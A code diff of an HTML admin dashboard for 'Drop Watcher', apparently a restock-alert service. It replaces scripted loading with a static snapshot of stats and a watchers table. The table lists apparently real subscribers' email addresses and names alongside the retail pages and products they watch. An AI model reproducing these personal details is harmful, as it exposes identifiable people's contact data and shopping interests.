@@ -3,170 +3,68 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="600">
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
   <title>Drop Watcher — Admin Dashboard</title>
   <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Share+Tech+Mono&family=Crimson+Pro:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     :root {
-      --black: #0a0a0a;
-      --steel: #1c1c1c;
-      --iron: #2a2a2a;
-      --ember: #c0392b;
-      --flame: #e67e22;
-      --ash: #888;
-      --silver: #d0d0d0;
-      --white: #f0f0f0;
-      --green: #2ecc71;
-      --yellow: #f1c40f;
+      --black: #0a0a0a; --steel: #1c1c1c; --iron: #2a2a2a;
+      --ember: #c0392b; --flame: #e67e22; --ash: #888;
+      --silver: #d0d0d0; --white: #f0f0f0; --green: #2ecc71; --yellow: #f1c40f;
     }
-
     body { background: var(--black); color: var(--white); font-family: 'Share Tech Mono', monospace; min-height: 100vh; }
-
     .dw-nav { border-bottom: 1px solid rgba(255,255,255,0.08); padding: 16px 32px; display: flex; align-items: center; gap: 32px; }
-    .dw-nav .logo { font-family: 'Share Tech Mono', monospace; font-size: 18px; font-weight: 700; color: var(--white); text-decoration: none; letter-spacing: 0.05em; }
+    .dw-nav .logo { font-size: 18px; font-weight: 700; color: var(--white); text-decoration: none; letter-spacing: 0.05em; }
     .dw-nav .logo span { color: var(--ember); }
-    .dw-nav a:not(.logo) { font-family: 'Share Tech Mono', monospace; font-size: 12px; text-decoration: none; color: var(--ash); letter-spacing: 0.08em; text-transform: uppercase; }
+    .dw-nav a:not(.logo) { font-size: 12px; text-decoration: none; color: var(--ash); letter-spacing: 0.08em; text-transform: uppercase; }
     .dw-nav a:not(.logo):hover { color: var(--white); }
-
     .content { max-width: 1200px; margin: 0 auto; padding: 32px 24px; }
-
     h1 { font-family: 'Bebas Neue', sans-serif; font-size: 48px; letter-spacing: 0.05em; margin-bottom: 8px; }
     .subtitle { color: var(--ash); font-size: 12px; letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 32px; }
-
-    /* ── Stats grid ─────────────────────────────── */
     .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-      gap: 1px;
-      background: var(--iron);
-      border: 1px solid var(--iron);
-      margin-bottom: 32px;
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 1px; background: var(--iron); border: 1px solid var(--iron); margin-bottom: 32px;
     }
-
-    .stat-card {
-      background: var(--black);
-      padding: 20px;
-      text-align: center;
-    }
-
+    .stat-card { background: var(--black); padding: 20px; text-align: center; }
     .stat-label { font-size: 10px; letter-spacing: 0.3em; color: var(--ash); text-transform: uppercase; margin-bottom: 8px; }
     .stat-value { font-family: 'Bebas Neue', sans-serif; font-size: 42px; color: var(--white); }
     .stat-value.green { color: var(--green); }
     .stat-value.ember { color: var(--ember); }
     .stat-value.flame { color: var(--flame); }
     .stat-value.yellow { color: var(--yellow); }
-
-    /* ── Sections ───────────────────────────────── */
     .section-title {
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: 28px;
-      letter-spacing: 0.05em;
-      color: var(--flame);
-      margin: 40px 0 16px;
+      font-family: 'Bebas Neue', sans-serif; font-size: 28px; letter-spacing: 0.05em;
+      color: var(--flame); margin: 40px 0 16px;
     }
-
-    /* ── Watchers table ─────────────────────────── */
     .table-wrap { overflow-x: auto; border: 1px solid var(--iron); }
-
     table { width: 100%; border-collapse: collapse; font-size: 12px; }
     th {
-      background: var(--steel);
-      padding: 10px 12px;
-      text-align: left;
-      font-size: 10px;
-      letter-spacing: 0.2em;
-      color: var(--ember);
-      text-transform: uppercase;
-      position: sticky;
-      top: 0;
+      background: var(--steel); padding: 10px 12px; text-align: left;
+      font-size: 10px; letter-spacing: 0.2em; color: var(--ember); text-transform: uppercase;
+      position: sticky; top: 0;
     }
     td {
-      padding: 8px 12px;
-      border-bottom: 1px solid var(--iron);
-      color: var(--silver);
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 11px;
+      padding: 8px 12px; border-bottom: 1px solid var(--iron);
+      color: var(--silver); font-size: 11px;
     }
     tr:hover td { background: var(--steel); }
-
-    .badge {
-      display: inline-block;
-      padding: 2px 8px;
-      font-size: 10px;
-      letter-spacing: 0.1em;
-      text-transform: uppercase;
-    }
+    .badge { display: inline-block; padding: 2px 8px; font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase; }
     .badge-active { background: var(--green); color: #000; }
     .badge-pending { background: var(--ash); color: #000; }
     .badge-critical { background: var(--ember); color: #fff; }
     .badge-high { background: var(--flame); color: #000; }
     .badge-medium { background: var(--yellow); color: #000; }
     .badge-low { background: var(--iron); color: var(--ash); }
-
     .url-cell { max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
     .kw-cell { max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-
-    /* ── Drops table ────────────────────────────── */
-    .drops-table td { font-size: 11px; }
-
-    /* ── System ─────────────────────────────────── */
-    .sys-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 1px;
-      background: var(--iron);
-      border: 1px solid var(--iron);
-    }
-
-    .sys-card {
-      background: var(--black);
-      padding: 16px 20px;
-    }
-
-    .sys-label { font-size: 10px; letter-spacing: 0.2em; color: var(--ash); text-transform: uppercase; margin-bottom: 4px; }
-    .sys-value { font-size: 13px; color: var(--silver); }
-    .sys-value.ok { color: var(--green); }
-    .sys-value.warn { color: var(--yellow); }
-    .sys-value.bad { color: var(--ember); }
-
-    /* ── Loading / error ────────────────────────── */
+    .generated { color: var(--ash); font-size: 11px; margin-bottom: 24px; }
     .loading { color: var(--ash); font-size: 13px; padding: 20px; }
-    .error { color: var(--ember); font-size: 13px; padding: 20px; }
-
-    /* ── Refresh ────────────────────────────────── */
-    .refresh-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 24px;
-    }
-    .refresh-btn {
-      background: var(--steel);
-      border: 1px solid var(--iron);
-      color: var(--ash);
-      padding: 8px 16px;
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 11px;
-      letter-spacing: 0.1em;
-      cursor: pointer;
-      text-transform: uppercase;
-    }
-    .refresh-btn:hover { border-color: var(--flame); color: var(--white); }
-    .last-refresh { font-size: 11px; color: var(--ash); }
-
     footer {
-      margin-top: 48px;
-      border-top: 1px solid var(--iron);
-      padding: 2rem 32px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 0.65rem;
-      letter-spacing: 0.3em;
-      color: var(--ash);
-      text-transform: uppercase;
+      margin-top: 48px; border-top: 1px solid var(--iron); padding: 2rem 32px;
+      display: flex; justify-content: space-between; align-items: center;
+      font-size: 0.65rem; letter-spacing: 0.3em; color: var(--ash); text-transform: uppercase;
     }
     .footer-hgr { color: var(--ember); font-family: 'Bebas Neue', sans-serif; font-size: 1.2rem; letter-spacing: 0.3em; }
   </style>
@@ -186,34 +84,19 @@
 
   <h1>ADMIN DASHBOARD</h1>
   <p class="subtitle">HGR eyes only</p>
+  <p class="generated">Generated 2026-05-11 04:50:02 UTC — auto-refreshes every 10 minutes</p>
 
-  <div class="refresh-bar">
-    <span class="last-refresh" id="lastRefresh">Loading...</span>
-    <button class="refresh-btn" onclick="loadAll()">Refresh</button>
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-label">Total Watches</div><div class="stat-value">83</div></div>
+    <div class="stat-card"><div class="stat-label">Active</div><div class="stat-value green">64</div></div>
+    <div class="stat-card"><div class="stat-label">Pending</div><div class="stat-value yellow">19</div></div>
+    <div class="stat-card"><div class="stat-label">Unique Emails</div><div class="stat-value flame">37</div></div>
+    <div class="stat-card"><div class="stat-label">Drops (24h)</div><div class="stat-value ember">61</div></div>
+    <div class="stat-card"><div class="stat-label">Critical (24h)</div><div class="stat-value ember">1</div></div>
+    <div class="stat-card"><div class="stat-label">Total Drops</div><div class="stat-value">4296</div></div>
+    <div class="stat-card"><div class="stat-label">SMS Ready</div><div class="stat-value">40</div></div>
   </div>
 
-  <!-- Stats cards -->
-  <div class="stats-grid" id="statsGrid">
-    <div class="stat-card"><div class="stat-label">Total Watches</div><div class="stat-value" id="statTotal">—</div></div>
-    <div class="stat-card"><div class="stat-label">Active</div><div class="stat-value green" id="statActive">—</div></div>
-    <div class="stat-card"><div class="stat-label">Pending</div><div class="stat-value yellow" id="statPending">—</div></div>
-    <div class="stat-card"><div class="stat-label">Unique Emails</div><div class="stat-value flame" id="statEmails">—</div></div>
-    <div class="stat-card"><div class="stat-label">Drops (24h)</div><div class="stat-value ember" id="statDrops24">—</div></div>
-    <div class="stat-card"><div class="stat-label">Critical (24h)</div><div class="stat-value ember" id="statCrit">—</div></div>
-    <div class="stat-card"><div class="stat-label">Total Drops</div><div class="stat-value" id="statDropsTotal">—</div></div>
-    <div class="stat-card"><div class="stat-label">SMS Ready</div><div class="stat-value" id="statSMS">—</div></div>
-  </div>
-
-  <!-- System health -->
-  <h2 class="section-title">System</h2>
-  <div class="sys-grid" id="sysGrid">
-    <div class="sys-card"><div class="sys-label">Latest Drop</div><div class="sys-value" id="sysLatestDrop"><a href="/alerts.html" style="color:inherit;text-decoration:none">—</a></div></div>
-    <div class="sys-card"><div class="sys-label">Last Preflight</div><div class="sys-value" id="sysPreflight">—</div></div>
-    <div class="sys-card"><div class="sys-label">Last Watchdog</div><div class="sys-value" id="sysWatchdog">—</div></div>
-    <div class="sys-card"><div class="sys-label">Watchdog Failures</div><div class="sys-value" id="sysFailures">—</div></div>
-  </div>
-
-  <!-- Watchers table -->
   <h2 class="section-title">Watchers</h2>
   <div class="table-wrap">
     <table>
@@ -230,8 +113,842 @@
           <th>Created</th>
         </tr>
       </thead>
-      <tbody id="watchersBody">
-        <tr><td colspan="9" class="loading">Loading watchers...</td></tr>
+      <tbody>
+        <tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>mrmecha@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://monkeyedge.com/"><a href="https://monkeyedge.com/" target="_blank" style="color:var(--flame)">monkeyedge.com</a></td>
+          <td class="kw-cell" title="Strider, frag, mefp, SnG, SMF, hinderer">Strider, frag, mefp, SnG, SMF, hinderer</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-05-08 13:36</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>davidcspann@gmail.com</td>
+          <td>David</td>
+          <td class="url-cell" title="https://smkw.com/spyderco-native-chief-sprint-run-brown-4-08in-plain-satin-leaf/"><a href="https://smkw.com/spyderco-native-chief-sprint-run-brown-4-08in-plain-satin-leaf/" target="_blank" style="color:var(--flame)">smkw.com</a></td>
+          <td class="kw-cell" title="Native chief 15v sprint">Native chief 15v sprint</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-05-01 22:58</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>davidcspann@gmail.com</td>
+          <td>David</td>
+          <td class="url-cell" title="https://smkw.com/spyderco-para-military-2-lightweight-sprint-run-brown-3-47in-plain-satin-clip-point/"><a href="https://smkw.com/spyderco-para-military-2-lightweight-sprint-run-brown-3-47in-plain-satin-clip-point/" target="_blank" style="color:var(--flame)">smkw.com</a></td>
+          <td class="kw-cell" title="15v paramilitary 2 lightweight">15v paramilitary 2 lightweight</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-05-01 22:54</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>phatramadan@rocketmail.com</td>
+          <td>alex</td>
+          <td class="url-cell" title="https://www.pokemoncenter.com/category/tcg-cards?sort=launch_date%2Bdesc"><a href="https://www.pokemoncenter.com/category/tcg-cards?sort=launch_date%2Bdesc" target="_blank" style="color:var(--flame)">pokemoncenter.com</a></td>
+          <td class="kw-cell" title="etb, booster, pack, poster, tin, ascended hero, pkc exclusive, destined rivals, prismatic">etb, booster, pack, poster, tin, ascended hero, pkc exclusive, destined rivals, prismatic</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-29 14:37</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>phatramadan@rocketmail.com</td>
+          <td>Alex</td>
+          <td class="url-cell" title="https://www.target.com/p/pok-233-mon-trading-card-game-mega-evolution-ascended-heroes-booster-bundle/-/A-95120834"><a href="https://www.target.com/p/pok-233-mon-trading-card-game-mega-evolution-ascended-heroes-booster-bundle/-/A-95120834" target="_blank" style="color:var(--flame)">target.com</a></td>
+          <td class="kw-cell" title="etb, booster, poster, tin, ascended hero, prismatic, pack, exclusive, box">etb, booster, poster, tin, ascended hero, prismatic, pack, exclusive, box</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-29 14:05</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>davidcspann@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.knivesshipfree.com/spyderco-paramilitary-2-lightweight-sprint-run-compression-lock-brown-frn-cpm-15v-c81pbn15v2/?searchid=13252743&amp;search_query=Paramilitary+2+lightweight+"><a href="https://www.knivesshipfree.com/spyderco-paramilitary-2-lightweight-sprint-run-compression-lock-brown-frn-cpm-15v-c81pbn15v2/?searchid=13252743&amp;search_query=Paramilitary+2+lightweight+" target="_blank" style="color:var(--flame)">knivesshipfree.com</a></td>
+          <td class="kw-cell" title="Paramilitary 2 lightweight 15v">Paramilitary 2 lightweight 15v</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-29 00:04</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simonhg@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.knifeart.com/chrisreeve.html"><a href="https://www.knifeart.com/chrisreeve.html" target="_blank" style="color:var(--flame)">knifeart.com</a></td>
+          <td class="kw-cell" title="SPD X CRK Inkosi Wave umnumzaan damascus">SPD X CRK Inkosi Wave umnumzaan damascus</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-25 14:58</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>randyp2855@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.arizonacustomknives.com/knives-by-maker/fellhoelter-brian/?page=1&amp;availability=1&amp;price%5Bmin%5D=%240&amp;price%5Bmax%5D=%2420%2C000+&amp;limit=50&amp;sortBy=recently_added"><a href="https://www.arizonacustomknives.com/knives-by-maker/fellhoelter-brian/?page=1&amp;availability=1&amp;price%5Bmin%5D=%240&amp;price%5Bmax%5D=%2420%2C000+&amp;limit=50&amp;sortBy=recently_added" target="_blank" style="color:var(--flame)">arizonacustomknives.com</a></td>
+          <td class="kw-cell" title="Zirconium">Zirconium</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-21 19:22</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>randyp2855@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://recon1.com/collections/new-gear?sort_by=created-descending"><a href="https://recon1.com/collections/new-gear?sort_by=created-descending" target="_blank" style="color:var(--flame)">recon1.com</a></td>
+          <td class="kw-cell" title="Fellhoelter">Fellhoelter</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>23</td>
+          <td>&#x2713;</td>
+          <td>2026-04-21 19:19</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msummerwill@yahoo.com</td>
+          <td>Mike</td>
+          <td class="url-cell" title="https://Target.com"><a href="https://Target.com" target="_blank" style="color:var(--flame)">Target.com</a></td>
+          <td class="kw-cell" title="Chaos rising">Chaos rising</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-17 03:15</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msummerwill@yahoo.com</td>
+          <td>Mike</td>
+          <td class="url-cell" title="https://Walmart.com"><a href="https://Walmart.com" target="_blank" style="color:var(--flame)">Walmart.com</a></td>
+          <td class="kw-cell" title="Chaos rising">Chaos rising</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-17 03:14</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>rjstackow@yahoo.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.amazon.com/gp/aw/d/B071Z5LBDP?psc=1&amp;ref=ppx_pop_mob_b_asin_title"><a href="https://www.amazon.com/gp/aw/d/B071Z5LBDP?psc=1&amp;ref=ppx_pop_mob_b_asin_title" target="_blank" style="color:var(--flame)">amazon.com</a></td>
+          <td class="kw-cell" title="Price drop, discount, saving, 30 day lowest price">Price drop, discount, saving, 30 day lowest price</td>
+          <td><span class="badge badge-medium">medium</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-12 04:26</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>randyp2855@gmail.com</td>
+          <td>Randy Pili</td>
+          <td class="url-cell" title="https://monkeyedge.com/edc-holsters/writing-tools/?product_list_limit=all&amp;sort=newest&amp;page=1"><a href="https://monkeyedge.com/edc-holsters/writing-tools/?product_list_limit=all&amp;sort=newest&amp;page=1" target="_blank" style="color:var(--flame)">monkeyedge.com</a></td>
+          <td class="kw-cell" title="Dragon">Dragon</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-08 17:28</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>762x51@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://whitemountainknives.com/vosteed-porcupine-tislim-folding-knife-gray-titanium-handle-154cm-drop-point-plain-edge-satin-finish-a4801/"><a href="https://whitemountainknives.com/vosteed-porcupine-tislim-folding-knife-gray-titanium-handle-154cm-drop-point-plain-edge-satin-finish-a4801/" target="_blank" style="color:var(--flame)">whitemountainknives.com</a></td>
+          <td class="kw-cell" title="ADD TO CART">ADD TO CART</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-07 18:12</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>762x51@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://whitemountainknives.com/vosteed-porcupine-tislim-folding-knife-acid-wash-gray-titanium-handle-s90v-drop-point-plain-edge-acid-wash-stonewash-finish-a4805/"><a href="https://whitemountainknives.com/vosteed-porcupine-tislim-folding-knife-acid-wash-gray-titanium-handle-s90v-drop-point-plain-edge-acid-wash-stonewash-finish-a4805/" target="_blank" style="color:var(--flame)">whitemountainknives.com</a></td>
+          <td class="kw-cell" title="add to cart">add to cart</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-07 18:11</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simonhg@gmail.com</td>
+          <td>simon</td>
+          <td class="url-cell" title="https://www.goldenstatemint.com/Silver-Bars/"><a href="https://www.goldenstatemint.com/Silver-Bars/" target="_blank" style="color:var(--flame)">goldenstatemint.com</a></td>
+          <td class="kw-cell" title="price below $80">price below $80</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-01 00:54</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msummerwill@yahoo.com</td>
+          <td>Mike</td>
+          <td class="url-cell" title="https://www.academy.com/"><a href="https://www.academy.com/" target="_blank" style="color:var(--flame)">academy.com</a></td>
+          <td class="kw-cell" title="Pokemon cards, TCG, booster packs, booster bundles, booster boxes, etb, collections">Pokemon cards, TCG, booster packs, booster bundles, booster boxes, etb, collections</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-30 06:05</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msummerwill@yahoo.com</td>
+          <td>Mike</td>
+          <td class="url-cell" title="https://www.walmart.com/shop/deals/flash-deals?facet=retailer_type%3AMarketplace+Sellers+fulfilled+by+Walmart%7C%7Cretailer_type%3APro+Sellers"><a href="https://www.walmart.com/shop/deals/flash-deals?facet=retailer_type%3AMarketplace+Sellers+fulfilled+by+Walmart%7C%7Cretailer_type%3APro+Sellers" target="_blank" style="color:var(--flame)">walmart.com</a></td>
+          <td class="kw-cell" title="Pokemon cards, drops, etb, TCG, booster bundle, booster box, sets">Pokemon cards, drops, etb, TCG, booster bundle, booster box, sets</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>7</td>
+          <td>&#x2713;</td>
+          <td>2026-03-30 05:59</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msummerwill@yahoo.com</td>
+          <td>Mike</td>
+          <td class="url-cell" title="https://www.target.com/?TCID=PDS-319991062"><a href="https://www.target.com/?TCID=PDS-319991062" target="_blank" style="color:var(--flame)">target.com</a></td>
+          <td class="kw-cell" title="Pokemon cards, TCG, booster boxes, booster bundles, etb, sets">Pokemon cards, TCG, booster boxes, booster bundles, etb, sets</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-30 05:58</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msummerwill@yahoo.com</td>
+          <td>Mike</td>
+          <td class="url-cell" title="https://www.bestbuy.com/"><a href="https://www.bestbuy.com/" target="_blank" style="color:var(--flame)">bestbuy.com</a></td>
+          <td class="kw-cell" title="Pokemon cards, TCG, booster box, booster bundle, sets, etb">Pokemon cards, TCG, booster box, booster bundle, sets, etb</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-30 05:55</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msummerwill@yahoo.com</td>
+          <td>Mike</td>
+          <td class="url-cell" title="https://www.samsclub.com/"><a href="https://www.samsclub.com/" target="_blank" style="color:var(--flame)">samsclub.com</a></td>
+          <td class="kw-cell" title="Pokemon cards, TCG, booster box, booster bundles, sets, etbs">Pokemon cards, TCG, booster box, booster bundles, sets, etbs</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-30 05:52</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>youve.reached.kyle.thompson@gmail.com</td>
+          <td>Kyle</td>
+          <td class="url-cell" title="https://pvk.com/hawk-knives-talon-dlc-m390-blade-black-dunes-carbon-fiber-handle-scales/"><a href="https://pvk.com/hawk-knives-talon-dlc-m390-blade-black-dunes-carbon-fiber-handle-scales/" target="_blank" style="color:var(--flame)">pvk.com</a></td>
+          <td class="kw-cell" title="Add to cart">Add to cart</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-29 03:05</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>youve.reached.kyle.thompson@gmail.com</td>
+          <td>Kyle</td>
+          <td class="url-cell" title="https://monkeyedge.com/chris-reeve-knives-folder-umnumzaan-tanto-monkey-edge-frag-pattern/"><a href="https://monkeyedge.com/chris-reeve-knives-folder-umnumzaan-tanto-monkey-edge-frag-pattern/" target="_blank" style="color:var(--flame)">monkeyedge.com</a></td>
+          <td class="kw-cell" title="Add to cart">Add to cart</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-29 02:48</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>youve.reached.kyle.thompson@gmail.com</td>
+          <td>Kyle</td>
+          <td class="url-cell" title="https://okluma.com/collections/frontpage/products/dc0"><a href="https://okluma.com/collections/frontpage/products/dc0" target="_blank" style="color:var(--flame)">okluma.com</a></td>
+          <td class="kw-cell" title="Add to cart">Add to cart</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-29 02:33</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>sourgrass@gmail.com</td>
+          <td>AN NGUYEN</td>
+          <td class="url-cell" title="https://www.selkirk.com/"><a href="https://www.selkirk.com/" target="_blank" style="color:var(--flame)">selkirk.com</a></td>
+          <td class="kw-cell" title="Selkirk LABS Project Boomstik Paddle">Selkirk LABS Project Boomstik Paddle</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-29 01:15</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simonhg@gmail.com</td>
+          <td>FOR MIKE</td>
+          <td class="url-cell" title="https://store.ui.com/us/en/category/cameras-dome-turret/products/uvc-g6-180?variant=uvc-g6-180-w"><a href="https://store.ui.com/us/en/category/cameras-dome-turret/products/uvc-g6-180?variant=uvc-g6-180-w" target="_blank" style="color:var(--flame)">store.ui.com</a></td>
+          <td class="kw-cell" title="&quot;coming soon&quot; &quot;add to cart&quot; &quot;in stock&quot; anything but sold out">&quot;coming soon&quot; &quot;add to cart&quot; &quot;in stock&quot; anything but sold out</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-28 11:53</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>gibson.simon1@gmail.com</td>
+          <td>SGH</td>
+          <td class="url-cell" title="https://southernedges.com/collections/chris-reeve-knives"><a href="https://southernedges.com/collections/chris-reeve-knives" target="_blank" style="color:var(--flame)">southernedges.com</a></td>
+          <td class="kw-cell" title="chris reeves damascus">chris reeves damascus</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-28 03:00</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simonhg@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://southernedges.com/collections/chris-reeve-in-stock-products"><a href="https://southernedges.com/collections/chris-reeve-in-stock-products" target="_blank" style="color:var(--flame)">southernedges.com</a></td>
+          <td class="kw-cell" title="in stock damascus">in stock damascus</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-27 15:15</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simonhg@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://monkeyedge.com/knives-tools/folders/"><a href="https://monkeyedge.com/knives-tools/folders/" target="_blank" style="color:var(--flame)">monkeyedge.com</a></td>
+          <td class="kw-cell" title="chris reeve damascus">chris reeve damascus</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-27 05:23</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>115579521@qq.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.dlttrading.com/chris-reeve-umnumzaan-category"><a href="https://www.dlttrading.com/chris-reeve-umnumzaan-category" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="&lt;span class=&quot;dropping-product-badge&quot;&gt;&lt;/span&gt;">&lt;span class=&quot;dropping-product-badge&quot;&gt;&lt;/span&gt;</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-24 03:53</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>kim@uandi.vc</td>
+          <td>Kimberly Moore</td>
+          <td class="url-cell" title="https://www.davidyurman.com"><a href="https://www.davidyurman.com" target="_blank" style="color:var(--flame)">davidyurman.com</a></td>
+          <td class="kw-cell" title="pearl ring, In stock, price below $600">pearl ring, In stock, price below $600</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-23 21:05</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>bien.goofyfoot@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.bentoboxshop.com/"><a href="https://www.bentoboxshop.com/" target="_blank" style="color:var(--flame)">bentoboxshop.com</a></td>
+          <td class="kw-cell" title="Spyderco Stretch, stretch light weight, K390, Cpm 15v,  HAP40, Delica, Gayle Bradley">Spyderco Stretch, stretch light weight, K390, Cpm 15v,  HAP40, Delica, Gayle Bradley</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>126</td>
+          <td></td>
+          <td>2026-03-23 15:49</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>bien.goofyfoot@gmail.com</td>
+          <td>—</td>
